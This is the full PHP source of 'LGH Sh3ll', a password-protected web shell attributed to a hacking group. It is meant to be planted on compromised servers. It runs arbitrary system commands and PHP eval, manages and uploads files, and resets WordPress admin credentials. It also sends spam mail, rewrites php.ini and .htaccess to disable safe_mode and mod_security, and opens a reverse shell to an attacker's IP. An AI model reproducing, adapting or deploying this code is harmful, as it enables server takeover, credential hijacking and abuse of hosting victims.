<?php

########################################################## 
###                    LGH Sh3ll                       ###
###              Libyan Ghosts Hackers                 ###
###                  Web Shell 2015                    ###
###     Bypass Disable Functions and Safe Moed         ###
###           Copyright © 2015 By Mr.Moneer            ###
########################################################## 

/* (Password shell) */ 
$auth_pass = "moneerlgh1994"; 
@session_start(); 
@error_reporting(0); 

if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
    ?> 
<center>
<style> 
body{background:#000;}  
input {
BORDER-RIGHT: #B5FF00 1px solid;
BORDER-TOP: #3E9900 1px solid;
BORDER-LEFT: #4A9900 1px solid;
BORDER-BOTTOM: #049900 1px solid;
BACKGROUND-COLOR: #181818;
font: 9pt tahoma;
color: #ffffff;
}
 </style>
 <link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">

 <img src="http://zonehmirrors.org/defaced/2015/02/16/gemusa.com.mx/im57.gulfup.com/FglpXQ.png" title="Libyan Ghosts Hackers" id="img" />
 <h4 style="color:#fff; font-family: orbitron;">LGH Sh3ll || Libyan Ghosts Hackers Web Shell </h4>
<div style=" 
   border-radius: 10px;
   border: 1px solid #45BD00;
   padding: 4px 2px;
   width: 25%;
   line-height: 24px;
   background: #000;
   color:#fff;
   "> 
  

<form method="post" >
<br />
Password : <input type="password" name="pass" />
<input type="submit" name="Login" value="Login" />
<br />

</form>
</div> 
</center>
    <?php 
    exit; 
} 
if( !isset( $_SESSION[($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( ($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin(); 


echo '<head>
<link href="http://fonts.googleapis.com/css?family=Orbitron:500" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="http://im60.gulfup.com/6gTfZ4.ico" />
<title>LGH Sh3ll :: Libyan Ghosts Hackers Web Shell   </title>
</head>
<style>
h2 {  text-shadow: 0px 0px 5px  }
h3 {  text-shadow: 0px 0px 5px  }

body{
background-color:#000000;
color:#00FF66;
}
.d1up{
border: solid;
border-color: #5e5e5e;
padding:0px;
width: 310px;
height: 21px;
margin-top: 15px;
}
#title {
font-family:Orbitron;
}
.d1cmd {
border: solid;
border-color: #5e5e5e;
padding:0px;
width: 218px;
height: 20px;
}
input {
BORDER-RIGHT: #B5FF00 1px solid;
BORDER-TOP: #3E9900 1px solid;
BORDER-LEFT: #4A9900 1px solid;
BORDER-BOTTOM: #049900 1px solid;
BACKGROUND-COLOR: #181818;
font: 9pt tahoma;
color: #ffffff;
}
.input_top {
width: 350px;
}
a:hover {
	color: #ffffff;
}
a {
	color:#00FF66;
	text-decoration :none;
	}
	
textarea {
BORDER-RIGHT: #ffffff 1px solid;
BORDER-TOP: #00BF56 1px solid;
BORDER-LEFT: #00BF56 1px solid;
BORDER-BOTTOM: #00BF56 1px solid;
BACKGROUND-COLOR: #060606;
color: #00FF66;
}
#td1{
border-bottom-color: rgb(69, 69, 69);
border-bottom-style: solid;
border-bottom-width: 1px;
border-collapse: separate;
display: table-cell;
font-family: Tahoma, Verdana, Arial;
font-size: 11px;
font-style: normal;
font-variant: normal;
font-weight: normal;
height: 24px;
line-height: 24px;
padding-bottom: 0px;
padding-left: 8px;
padding-right: 8px;
padding-top: 0px;
text-align: start;
text-shadow: rgb(153, 153, 153) 0px 0px 3.29999995231628px;
vertical-align: middle;
white-space: normal;
width: 450px;
}
.td2{
border-bottom-color: rgb(69, 69, 69);
border-bottom-style: solid;
border-bottom-width: 1px;
border-collapse: separate;
display: table-cell;
font-family: Tahoma, Verdana, Arial;
font-size: 11px;
font-style: normal;
font-variant: normal;
font-weight: normal;
height: 24px;
line-height: 24px;
padding-bottom: 0px;
padding-left: 8px;
padding-right: 8px;
padding-top: 0px;
text-align: start;
text-shadow: rgb(153, 153, 153) 0px 0px 3.29999995231628px;
vertical-align: middle;
white-space: normal;
width: 130px;
}
#info {
border: 4px double green;
box-shadow: 0px 9px 8px rgb(86, 78, 48);
border-radius: 8px;

}
ul {
margin: 0;
padding: 5px;
float: left;
-moz-border-radius: 8px;
border-radius: 12px;
border: 1px solid #555555;
}
.haeder{
    padding-left: 10px;
    padding-right: 10px;
    padding-bottom: 10px;
    padding-top: 10px;
    margin-right: 50px;
    margin-bottom: 10px;
    margin-left: 24px;
	margin-right: 25px;
    font-family: orbitron;
	font-size:12px;
	text-shadow: rgb(153, 153, 153) 0px 0px 3.29999995231628px;
}
.alist { padding-right: 40px; }
.ahome { padding-left: 40px; }

.divme{

   border-radius: 10px;
   border: 1px solid #45BD00;
   padding: 4px 2px;
   width: 70%;
   line-height: 24px;
   background: #111111;

   }
   .divbc{

   border-radius: 10px;
   border: 1px solid #45BD00;
   padding: 4px 2px;
   width: 35%;
   line-height: 24px;
   background: #111111;

   }

.clear{clear:both;}
</style>';

error_reporting(0);

//error_reporting(E_ALL ^ E_NOTICE); 
echo "<div>";

//info system
echo "<div id=info>";
 echo "<table>";
      echo "<tr>"; 
	  echo "<td>";
	  echo "Uname : ";
    echo php_uname();
	 echo "</td>";
	  echo "</tr>";
	echo "</table>";
	echo "<table>";
      echo "<tr>"; 
	  echo "<td>";
	echo "php version : ";
	echo phpversion();
	echo "</td>";
	  echo "<td>";
	   $d =  date('Y-m-d H:i:s');
	   echo "Datetime : ";
	  echo $d;
		echo "</td>";
		echo "<td>";
		
		if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = TRUE;
 $hsafemode = "<font color=red>ON </font>";
}
else {

$safemode = FALSE; $hsafemode = "<font color=green>OFF </font>";

}

 echo "safe mode:$hsafemode" ;
		
		echo "</td>";
		echo "<td>"; 
		echo "Client IP : "; 
          echo  getenv('REMOTE_ADDR');
		   echo "</td>";
	  echo "</tr>";
	  
	  	echo "<tr>";
		   echo "<td>";
		   echo "root File : " .$_SERVER['DOCUMENT_ROOT'];
		   echo "</td>";
		   echo "<td>";
		   echo 'User: ' . get_current_user();
		   echo ' Group :'.getmyuid();
		   echo ' gid : ' .getmygid();
		   echo "</td>";
		    echo "<td>";
		   echo "<a href='#'>PHP INFO</a>";
		   
		   echo "</td>";
		     echo "<td>"; 
		echo "Server IP : ";
          echo $_SERVER['SERVER_ADDR'];
		   echo "</td>";
			 
		   echo "</tr>";
		    echo "<tr>";
			  echo "<td>";
			    echo  "Software : ";
                    echo $_SERVER['SERVER_SOFTWARE'];
				echo "</td>";
				
				echo "<td>";
				echo "webmail : ";
			    echo $_SERVER['SERVER_ADMIN'];

				echo "</td>";
				
				echo "<td>";
			     echo "Site : ";
				   echo $_SERVER['HTTP_HOST'];
				  echo "</td>";
				echo "<td>";
				   echo "Port : ";
				    echo $_SERVER['SERVER_PORT'];
					echo "</td>";
			   echo "</tr>";
		   
	echo "</table>";
	       echo "</table>";
		     echo "</div>";
		  echo"</div>";
		     echo "<br />";
		  echo "<ul class='haeder'>";
echo "<center>";
echo "<a href='?' class='alist ahome' > Home </a>";
echo "<a href='?about=me' class='alist' > About  </a>";
echo "<a href='?file=manager' class='alist' > File Manager  </a>";
echo "<a href='?file=Upload'  class='alist' > Upload File  </a>";
echo "<a href='?info=server' class='alist' > Information  Server  </a>";
echo "<a href='?En=cryption' class='alist' > Script Encryption  </a>";
echo "<a href='?spam=mailer'  class='alist' > Mailer  </a>";
echo "<a href='?cpa=wp'  class='alist' > Change Admin Wordpress  </a>";
echo "<a href='?code=eval' class='alist'  > Eval  </a>";
echo "<a href='?Self=remove'  class='alist' > Self remove  </a>";
echo "<a href='?bypass=1' class='alist'  > Bypass Disable Functions and Safe Moed  </a>";
echo "<a href='?back=conncet'  class='alist' > Back Connect  </a>";
echo "</ul>";
echo "<br />";
//show files
echo "<div>";

$pwd = getcwd();
echo "<table style='    margin-bottom: 10px;    margin-left: 25px;'>";
//$folder_root = $_SERVER['DOCUMENT_ROOT'];
$viewf = chdir($_POST['view']);

echo "<tr>";
echo "<p><form method='post' >
<td>Pwd | $pwd </td> <td><input type='text' name='view'  class='input_top' placeholder='view file/folder' />
<input type='submit' value='Change dir' /></td>
</form></p>";
echo "</tr>";
//cmd
$user_cmd = get_current_user();
echo "<tr>";
echo "<form  method='post' />
<td>$user_cmd  | </td><td><input type='text' name='cmd' class='input_top' placeholder='Command The System' />
<input type='submit' name='submitc' value='Command '  /></td>
</form>";
echo '<div class="clear"> </div>';
echo "</tr>";
echo "</table>";
$cmd = $_POST['cmd'];

if($_POST['submitc']){
echo "<textarea cols='100' rows='18'>";
system($cmd);
echo "</textarea>";
}

$fils  = $_GET['file'];

if($fils == 'manager'){
$dir= getcwd(); 
$dir2=scandir($dir); 
for($i=0;$i<count($dir2);$i++)  

   {  
   echo "<table>";
echo "<td id=td1>";
  echo $dir2[$i]; 
  echo "</td>";
  //filetype
  echo "<td class=td2>";
  echo filetype($dir2[$i]); 
  echo "</td>";
  //fileo:g
  echo "<td class=td2>";
  echo fileowner($dir2[$i])." : ";
  echo filegroup($dir2[$i]);
  echo "</td>";
  //filesize
  echo "<td class=td2>";
  echo filesize($dir2[$i])." bytes";
  echo "</td>";
  //fileperms
  echo "<td class=td2>";
  echo substr(sprintf("%o",fileperms($dir2[$i])),-4); 
  echo "</td>";
  
  //modified
  echo "<td class=td2>";
  echo date (" Y / d / H:i:s",filemtime($dir2[$i]));
  echo "</td>";
  
  echo "</tr>";
  echo "</table>";
      
	  
   } 
   $newf = $_POST['newf'];
mkdir($newf, 0777, true);
chmod($newf, 0777);

echo "<br /><br /><table>";
echo '<tr><td style="
    padding-right: 50px;
    padding-left: 50px;
"> ';
echo "<form method='post' >
Read File : <input type='text' name='file_edit' />
<input type='submit' name='getf' value='get !' />
</form>";



echo "<td style='
    padding-right: 50px;
'><form method='post' >
Make dir : <input type='text' name='newf'  />
<input type='submit' name='mkdir' value='Make' />
</form></td>";
if(isset($_POST['mkdir'])){

	 echo "Dir name : " . $newf;
 
}
echo "<td style='
    padding-right: 50px;
'><form method='post' >
Del file : <input type='text' name='delf'  />
<input type='submit' name='submitdel' value='Del file' />  
</form></td>";
$delf = $_POST['delf'];
if(isset($_POST['submitdel'])){
    unlink($delf);
}
echo '<td style="
    padding-right: 10px;
"><form method="post">
<input type="text" name="filen" />
<input type="text" name="fc" value="0755" size="5"/>
<input type="submit" name"chmod" value="chmod" />
</form></td></tr>';
     $filen = $_POST['filen'];
     $fc = $_POST['fc'];
 
     if(isset($_POST['chmod'])){
   
           chmod(".$filen.",$fc);
         
            echo "file name : ".$filen."<br />";
            echo "Chmod : ".$fc;
      }
echo "</table>";
$file = $_POST['file_edit'];
if($_POST['getf']){
echo "<form method='post' ><textarea name='code' cols='100' rows='20'>";
echo file_get_contents($file);

echo "</textarea><br /> <input type='submit' name='save' value='get !' /></form>";
      $data = $_POST['code'];
        function save($data,$file){
           $fp = fopen($file,'w')or die("Error");
           fwrite($fp,serialize($data));
           fclose($fp);
        }  


           if(isset($_POST['save'])){
           save($data,$file);
        }
}


$of = $_POST['file1'];
if(isset($_POST['frsubmit'])){
   

   echo '<div style="background:#000000;">'.readfile($of).'</div>';

    }
       echo "</div>";
     echo "<div>";
	 }
$up  = $_GET['file'];

if($up == 'Upload'){
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
$tr = $_POST['track'];
$pwd = getcwd();
echo " <br /><center><div class='divbc'><h3 style=' font-family: orbitron;'>   Upload File      </h3>
     <table>
       <form method='POST' enctype='multipart/form-data'>
	   	  <tr>
		   <td>File Name  </td>
	        <td>
	         <input type='file'name='file' /><br />
		    </td>
         </tr>
		 <tr>
		   <td>Path  </td>
	        <td>
	         <input type='text'name='track' value='$pwd'  style='width: 240px;height: 24px;margin-top: 5px;' /><br />
			 </td>
          </tr>
		  <tr>
	        <td>		  
	         <input type='submit' name='submitup' value='upload' />
			 </td>
          </tr>			 
       </form>
    </table></div></center>
";
//
if($_POST['submitup']){
move_uploaded_file($filetmp,$tr.$filename);

echo "<center>".$filename."</center>";
    }
}

$ipsrv = $_SERVER['SERVER_ADDR'];
$site = $_SERVER['HTTP_HOST'];
$software = $_SERVER['SERVER_SOFTWARE'];
$os = PHP_OS;


function Curl() {
	if(extension_loaded('curl')){$curl = '<font color="red">ON</font>';}
	else{$curl = '<font color="green">OFF</font>';}return $curl;
}
function openBaseDir() {
	$openBaseDir = ini_get("open_basedir");
	if (!$openBaseDir){$openBaseDir = '<font color="green">OFF</font>';}
    else {$openBaseDir = '<font color="red">ON</font>';}	
	return $openBaseDir;
}
function Gzip() {
	if (function_exists('gzencode')){$gzip = '<font color="red">ON</font>';}
	else {$gzip = '<font color="green">OFF</font>';}return $gzip;
}
function Oracle() {
	if(function_exists('ocilogon')){$oracle = '<font color="red">ON</font>';}
	else {$oracle = '<font color="green">OFF</font>';}return $oracle;
}
function MSQL() {
         	if (function_exists('msql_connect')){$mSql = '<font color="red">ON</font>';}
	               else {$mSql = '<font color="green">OFF</font>';}return $mSql;
}
function MySQL2() {
	$mysql_try = function_exists('mysql_connect');
		               if($mysql_try){$mysql = '<font color="red">ON</font>';}
	else {$mysql = '<font color="green">OFF</font>';}return $mysql;
}
function MysqlI() {
		               if (function_exists('mysqli_connect')){$mysqli = '<font color="red">ON</font>';}
	else {$mysqli = '<font color="green">OFF</font>';}return $mysqli;
}
function MsSQL() {
	               	if(function_exists('mssql_connect')){$msSQL = '<font color="red">ON</font>';}
	else {$msSQL = '<font color="green">OFF</font>';}return $msSQL;
}
$infoserv = $_GET['info'];
//info server
if($infoserv == "server"){
	               echo "<br /><center><h3 style=' font-family: orbitron;'>  Information  Server    </h3><table>";
         echo "<tr>";
       echo "<td>ip server  </td><td>".$ipsrv."</td>";
	    echo "</tr>"; 
		echo "<tr>";
       echo "<td>System  </td><td>".$os."</td>";
	    echo "</tr>";
		
	   echo "<tr>";
	   echo "<td>Software   </td><td> ".$software."</td> ";
	   echo "<tr>";
	   
	     echo "<tr>";
		echo "<td>cURL   </td><td>".Curl()."</td> ";
		 echo "</tr>"; 
		 
		 echo "<tr>";
		echo "<td>Open Basedir	   </td><td>".openBaseDir()."</td> ";
		 echo "</tr>"; 
		 
		 echo "<tr>";
		echo "<td>Gzip	   </td><td>".Gzip()."</td> ";
		 echo "</tr>";
		 
		 echo "<tr>";
		echo "<td>Oracle	   </td><td>".Oracle()."</td> ";
		 echo "</tr>";	

		 echo "<tr>";
		echo "<td>MSQL	   </td><td>".MSQL()."</td> ";
		 echo "</tr>";
	  
    	  echo "<tr>";
		echo "<td>MySQL	   </td><td>".MySQL2()."</td> ";
		 echo "</tr>";
		 
	      echo "<tr>";
		echo "<td>MySQLi	   </td><td>".MysqlI()."</td> ";
		 echo "</tr>";
		 
	   	 echo "<tr>";
		echo "<td>MsSQL	   </td><td>".MsSQL()."</td> ";
		 echo "</tr>";
	   
      	                echo '<td> Zone-h Mirrors  </td><td><a href="http://www.zone-h.org/archive/ip='.$ipsrv.'" target="_blank"> Zone-h </a></td>';
	 	                 echo "</tr>";
	   
	   echo "<tr>";
       echo '<td> Sites Server  </td><td><a href="http://www.sameip.org/'.$ipsrv.'" target="_blank"> SameIP </a></td>';
	   echo "</tr>";
	   
       //echo '<a href="'.$site.'.dnsdb.org" target="_blank"> SubDomin </a><br />';


echo "</table></center>";

}
 $encoding = $_GET['En'];
 if($encoding == "cryption"){
echo	'<center><h3 style=" font-family: orbitron;">    Script Encryption      </h3><br /> 
     <center>
	 <ul style="padding-left: 0px;margin-left: 250px;">
	 <a href="?En=cryption&en64=2">[ Encode base64 ]</a>
	 <a href="?En=cryption&de64=1">[ Decode base64 ]</a>
	 <a href="?En=cryption&urlencode2=1">[ URL Encode ]</a>
	 <a href="?En=cryption&urldecode2=1">[ URL Decode ] </a>
	 <a href="?En=cryption&md52=1">[ MD5 ] </a>
	 <a href="?En=cryption&ensha1=1">[ SHA1 ] </a>
	 <a href="?En=cryption&crypt1=1">[ Crypt ]</a>
	 <a href="http://hashkiller.co.uk/md5-decrypter.aspx" target="_blank">[ MD5 cracker ] </a>
	 <a href="http://hashkiller.co.uk/sha1-decrypter.aspx" target="_blank">[ SHA1 cracker ] </a>
	 </ul>
	 </center>
	 <br />';
echo "<br />";

//encode base64
$enb64 = $_POST['en64'];
$enbase64 = base64_encode($enb64);
$en64 = $_GET['en64'];

if($en64 == "2"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='en64'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='Encode base64' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo $enbase64;
echo "</textarea>";
}
//decode base64 
$deb64 = $_POST['de64'];
$debase64 = base64_decode($deb64);
$de64 = $_GET['de64'];
if($de64 == "1"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='de64'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='Decode base64' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo htmlspecialchars($debase64);
echo "</textarea>";
}
//en md5
$enmd5 = $_POST['md5en'];
$enmd51 = md5($enmd5);
$md52 = $_GET['md52'];
if($md52 == "1"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='md5en'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='Encrypt MD5 ' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo $enmd51;
echo "</textarea>";
}
//en sha1
$ensha1 = $_POST['ensha13'];
$ensha11 = sha1($ensha1);
$ensha1 = $_GET['ensha1'];
if($ensha1 == "1"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='ensha13'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='Encrypt SHA1' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo $ensha11;
echo "</textarea>";
}
//crypt
$encrypt = $_POST['crypt1'];
$encrypt1 = crypt($encrypt);
$encrypt2 = $_GET['crypt1'];
$encrypt2 = $_GET['crypt1'];
if($encrypt2 == "1"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='crypt1'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='Encrypt crypt' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo $encrypt1;
echo "</textarea>";
}
//urlencode
$urlencode0 = $_POST['urlencode3'];
$urlencode1 = urlencode($urlencode0);
$urlencode2 = $_GET['urlencode2'];
if($urlencode2 == "1"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='urlencode3'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='URL Encode' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo $urlencode1;
echo "</textarea>";
}
//urldecode
$urldecode0 = $_POST['urldecode'];
$urldecode1 = urldecode($urldecode0);
$urldecode2 = $_GET['urldecode2'];
if($urldecode2 == "1"){
echo "<form method='post' />";
echo "<textarea cols='80' rows='15' name='urldecode'>";
echo "</textarea>";
echo "<br />";
echo "<input type='submit' value='URL Decode' />";
echo "</form>";
echo "<textarea cols='80' rows='15'>";
echo $urldecode1;
echo "</textarea>";
}

echo "</center>";
  }
  $cpa = $_GET['cpa'];
  if($cpa == "wp"){
  echo '<br /><center><div class="divbc"> <h3 style=" font-family: orbitron;"> Change Admin Wordpress  </h3>
		 <form method="POST">
		  <table border="0">
		     <tr>  
		 <td>  DB Host    </td><td><input type="text" name="host_wp" value="localhost"/></td>
		   </tr>
		   <tr>
		  <td> DB Name    </td><td><input type="text" name="db_wp" /></td>
		   </tr>
		   <tr>
		  <td> DB User    </td><td><input type="text" name="u_wp" /></td>
		   </tr>
		   <tr>
		  <td> DB Pass    </td><td><input type="text" name="p_wp" /></td>
		   </tr>
		   <tr>
		  <td> Username   </td><td><input type="text" name="user_wp" value="admin" /></td>
		   </tr>
		   <tr>
		 <td>  Password   </td><td><input type="text" name="pass_wp" value="moneer"/></td>
		   </tr>
		   
		   <tr>
		  <td> <input type="submit" name="submit_wp" value="Change" /></td>
		   </tr>
		 </form>
		   </table></div>';
		   
		   
		  /* function cpa($localhost,$db_user,$db_password,$db_name,$usernamewp,$Passwordwp){
		   
		   if(isset($localhost,$db_user,$db_password,$db_name,$usernamewp,$Passwordwp)){
		   
		   $localhost = $_POST['host_wp'];
           $db_user = $_POST['u_wp'];
           $db_password = $_POST['pass_wp'];
           $db_name = $_POST['db_wp'];
           $usernamewp = $_POST['user_wp'];
		   $Passwordwp = $_POST['pass_wp'];
		   $passhash = md5($Passwordwp);
           mysql_connect($localhost,$db_user,$db_password);
           mysql_select_db($db_name);
		  $sql = "UPDATE `wp_users` SET `user_login` = '$usernamewp', `user_pass` = '$passhash' WHERE `ID` = 1";
           mysql_query($sql);
		   }
		   
		   }*/
         //show
		   if($_POST['submit_wp']){

		   $localhost = $_POST['host_wp'];
           $db_user = $_POST['u_wp'];
           $db_password = $_POST['p_wp'];
           $db_name = $_POST['db_wp'];
           $usernamewp = $_POST['user_wp'];
		   $Passwordwp = $_POST['pass_wp'];
		   
		   $passhash = md5($Passwordwp);
           mysql_connect($localhost,$db_user,$db_password);
           mysql_select_db($db_name);
		   $sql = "UPDATE wp_users SET `user_login` = '$usernamewp', `user_pass` = '$passhash' WHERE `ID` = 1";
           mysql_query($sql);
		   $sql2 = "SELECT * FROM '$Prefix'options WHERE `option_name` = 'siteurl'";
                 $query2 = mysql_query($sql2);
                 while($row=mysql_fetch_array($query2)){
				 echo "<table>";
				 echo "<tr><td>  WebSite Wordpress  </td><td> User </td><td>Pass</td></tr>";
			   echo "<tr><td>".$row['option_value']."/wp-login.php</td>";
			   echo "<td>".$usernamewp."</td>";
               echo "<td>".$Passwordwp."</td>";
               echo "</tr>";
			   echo "</table>";
                  } 
				    }
				 
		                   }
		   
 $mailer = $_GET['spam'];
 
if($mailer == "mailer"){
$to = $_POST['to'];
$from = $_POST['from'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$headers = $from;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

if($_POST['submitmail']){
   if(empty($to) && empty($from) && empty($subject) && empty($message)  ){
     echo " empty value ";
	 
     	                  }elseif (!$to == filter_input(INPUT_POST,"to",FILTER_VALIDATE_EMAIL)) {
   
              echo "Invalid Text ...  "; 
       
         }else{
       mail($to,$subject,$message,$headers);
       echo "Send OK ".$to." ...";
     }
 } 

echo '<center>
<h3 style=" font-family: orbitron;  margin-left: 50px;"> Mailer Inbox  </h3>
<table>
<form  method="post" >
<tr>
<td>To </td> <td><input type="text" name="to" style="width: 301px;" /> </td>
</tr>

<tr>
<td>Subject </td> <td><input type="text" name="subject" style="width: 301px;" /> </td>
</tr>


<tr>
<td>From </td> <td><input type="text" name="from" style="width: 301px;" /> </td>
</tr>

<tr>
<td>Message </td> <td><textarea name="message" cols="40" rows="10" ></textarea></td>
</tr>

<tr>
<td> </td><td><input type="submit" name="submitmail" value="Send Message" style="margin-left: 105px; margin-top: 10px;" /> </td>
</tr>
</form>
</table>
</center>';
}

$eval = $_GET['code'];
   if($eval == "eval"){
	               echo '<center><div class="divbc"> <h3 style=" font-family: orbitron;"> Execution Code PHP   </h3>
<form method="post">

<br /><textarea name="code" cols="40" rows="10" >  phpinfo(); </textarea><br /><br />

<input type="submit" name="submit_code" value="eval !" />

</form></div></center>';

$code = $_POST['code'];

	               if(isset($_POST['submit_code'])){

	               echo '<div><center>';
  
	                 echo eval($code);
  
	               echo '</div></center>';
 	                }
}

//about
$About = $_GET['about']; 
if($About == "me"){
   echo '<center>
   <div class="divme">
       
	    <br />
		<p><h1 style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 40px; margin-bottom: 35px;" > LGH Sh3ll </h1></p>
		<p><h1 style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 38px;" >Libyan Ghosts Hackers</h1></p>
		<p style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 30px;" >Web Shell 2015</p>
		<p style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 25px;">Coded By <a href="https://www.facebook.com/moneer.massoud" target="_blank" style="color: #00ff00; " >Mr.Moneer</a></p>
		<p style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 25px;"> <a href="https://www.youtube.com/user/moneermasoud" target="_blank" style="color: #00ff00; " >YouTube |</a> <a href="https://www.facebook.com/LGH.Official" target="_blank"  style="color: #00ff00; " >Facebook |</a> <a href="http://www.zone-h.org/archive/notifier=LGH" target="_blank" style="color: #00ff00; "  >Zone-H</a></p>
		<p style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 25px;" >Greets To  : Alansary | Moad Hack | Ly Ghost</p>
		<p style="text-align: center; font-family: orbitron; color: #00ff00; font-size: 25px;" > Copyright &copy; 2015 By Mr.Moneer </p>
		<br />
		';

}
//?Self=remove&now=yes
$self = $_GET['Self'];
    if($self == "remove"){
        echo "<br /><center>";
        echo "Remove the Shell ?<br />"; 
        echo "<a href='?Self=remove&now=yes' >Yes </a>";	
        echo "</center>";		
		 $remove = $_GET['now'];
           if($remove == "yes"){
		   unlink(__FILE__);
		  }
   }

//link : ?bypass=1
//Bypass Disable Functions and Safe Moed
$bypass = $_GET['bypass'];
if ($bypass == "1"){
	$phpi = '
safe_mode = Off 
disable_functions = NONE 
safe_mode_gid = OFF 
open_basedir = OFF 

';
$file = fopen("php.ini","w+");
	fwrite($file,$phpi);
	fclose($file);	 
$htac = "
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC ".getcwd()."/php.ini ";

$fileh = fopen(".htaccess","w+");
	fwrite($fileh,$htac);
	fclose($fileh);	 

  echo "<center><h3 style=' font-family: orbitron;'> Bypass Disable Functions and Safe Moed  </h3>  </center>";
  echo "<center><p><h4><a href='php.ini' target='_blank' > check </a></h4></p></center>";


}
//link : ?back=conncet
//back connect 
$backconnect = $_GET['back'];
if($backconnect == "conncet"){
print ( '<title>Back Connect</title>' );
$myipc = getenv('REMOTE_ADDR');
echo "<br><center> 
       <div class='divbc'>
              <h3 style=' font-family: orbitron;'>    Back Connect      </h3>
            <h4> nc -vv -l -p 21</h4>
            <form method='POST' action=''>
                
           IP <input type='text' name='ipim' size='15' value='$myipc'>
           Port <input type='text' name='portum' size='5' value='5544'><br><br> 
            <input type='submit' value='Connect'><br><br>
            
            </form></div></center>"; 
            
         $ipim=$_POST['ipim']; 
         $portum=$_POST['portum']; 
         if ($ipim <> "") 
         { 
         $mucx=fsockopen($ipim , $portum , $errno, $errstr ); 
         if (!$mucx){ 
               $result = "Error: didnt connect !!!"; 
         } 
         else { 
         
         $zamazing0="\n";
                  
    	                    fputs ($mucx ,"\nwelcome LGH Shell\n\n");
    	                    fputs($mucx , system("uname -a") .$zamazing0 );
    	                    fputs($mucx , system("pwd") .$zamazing0 );
    	                    fputs($mucx , system("id") .$zamazing0.$zamazing0 );
	                        while(!feof($mucx)){  
       fputs ($mucx); 
       $one="[$";
       $two="]";
       $result= fgets ($mucx, 8192); 
      $message=`$result`; 
       fputs ($mucx, $one. system("whoami") .$two. " " .$message."\n"); 
      } 
      fclose ($mucx); 
         } 
         } 
}

        
   
?>